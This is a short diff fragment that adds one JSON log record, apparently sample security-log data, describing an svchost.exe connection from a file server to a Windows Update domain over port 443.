+  {"_time": "2026-02-11T08:10:00+05:30", "event_type": "network_connection", "host": "FILESERVER01", "user": "SYSTEM", "process": "svchost.exe", "src_ip": "10.0.1.100", "dest_ip": "13.107.4.52", "dest_port": 443, "protocol": "TCP", "bytes_out": 2000, "bytes_in": 50000, "domain": "windowsupdate.microsoft.com"}
+]
